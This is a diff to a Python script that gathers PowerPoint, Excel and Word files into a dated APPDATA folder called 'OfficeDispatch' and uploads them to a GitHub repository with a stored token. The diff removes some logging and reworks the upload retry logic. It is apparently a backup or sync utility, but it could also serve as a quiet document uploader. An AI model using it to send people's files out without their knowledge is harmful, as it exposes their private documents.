@@ -27,7 +27,6 @@ key = base64.urlsafe_b64encode(hashlib.sha256(PASSWORD.encode()).digest())
 appdata_path = os.getenv('APPDATA')
 repo_path = os.path.join(appdata_path, "OfficeDispatch")
 LOG_FILE_PATH = os.path.join(repo_path, current_date, f'{current_date}.log')
-print(LOG_FILE_PATH)
 cipher_suite = Fernet(key)
 upload_queue = queue.Queue()
 
@@ -56,12 +55,10 @@ def load_config():
     if os.path.exists(CONFIG_PATH):
         try:
             with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
-                log_message(f'Opening config file: {CONFIG_PATH}')
                 user_config = json.load(f)
             for key, default_value in DEFAULT_CONFIG.items():
                 if key in user_config:
                     if validate_config_value(key, user_config[key]):
-                        log_message(f'Valid value for {key}: {user_config[key]}')
                         config[key] = user_config[key]
                     else:
                         log_message(f'Invalid value for {key}: {user_config[key]}. Resetting to default value.')
@@ -73,7 +70,6 @@ def load_config():
                     config["github_token"] = config["github_token"]
                     user_config["github_token"] = encrypted_token
                     with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
-                        log_message(f'Saving encrypted GitHub token in config file.')
                         json.dump(user_config, f, ensure_ascii=False, indent=4)
                 else:
                     try:
@@ -147,8 +143,7 @@ def copy_file(file_name, file_size, category, target_folder, log_file_path):
 def process_files():
     try:
         target_folder = os.path.join(repo_path, current_date)
-        log_file_path = os.path.join(target_folder, "log.txt")
-        
+        log_file_path = os.path.join(repo_path, current_date, f'{current_date}.log')
         for folder in ["PowerPoint", "Excel", "Word"]:
             os.makedirs(os.path.join(target_folder, folder), exist_ok=True)
         
@@ -213,42 +208,37 @@ def upload_files_to_github(repo_name, token, upload_queue, log_file_path):
         while attempt < config['retry_interval'] and not success:
             try:
                 existing_file = repo.get_contents(full_rel_path)
-                if existing_file.sha != hashlib.sha1(content).hexdigest():
-                    repo.update_file(
-                        path=full_rel_path,
-                        message=commit_message,
-                        content=content,
-                        sha=existing_file.sha,
-                        branch="main"
-                    )
-                    log_message(f"Updated {full_rel_path}", log_file_path)
+                repo.update_file(
+                    path=full_rel_path,
+                    message=commit_message,
+                    content=content,
+                    sha=existing_file.sha,
+                    branch="main"
+                )
+                log_message(f"Updated {full_rel_path}", log_file_path)
                 success = True
             except Exception as e:
-                if attempt < config['retry_interval'] - 1:
+                if str(e).startswith('404'):
+                    try:
+                        repo.create_file(
+                            path=full_rel_path,
+                            message=commit_message,
+                            content=content,
+                            branch="main"
+                        )
+                        log_message(f"Uploaded {full_rel_path}", log_file_path)
+                        success = True
+                    except Exception as create_e:
+                        log_message(f"Error uploading {full_rel_path}: {create_e}. Retrying...")
+                        time.sleep(config['retry_interval'])
+                        attempt += 1
+                else:
                     log_message(f"Error updating {full_rel_path}: {e}. Retrying...")
                     time.sleep(config['retry_interval'])
-                else:
-                    log_message(f"Failed to update {full_rel_path} after multiple attempts: {e}")
-                attempt += 1
-
-            if not success:
-                try:
-                    repo.create_file(
-                        path=full_rel_path,
-                        message=commit_message,
-                        content=content,
-                        branch="main"
-                    )
-                    log_message(f"Uploaded {full_rel_path}", log_file_path)
-                    success = True
-                except Exception as e:
-                    if attempt < config['retry_interval'] - 1:
-                        log_message(f"Error uploading {full_rel_path}: {e}. Retrying...")
-                        time.sleep(config['retry_interval'])
-                    else:
-                        log_message(f"Failed to upload {full_rel_path} after multiple attempts: {e}")
                     attempt += 1
 
+        if not success:
+            log_message(f"Failed to process {full_rel_path} after multiple attempts.")
         upload_queue.task_done()
 
 while True:
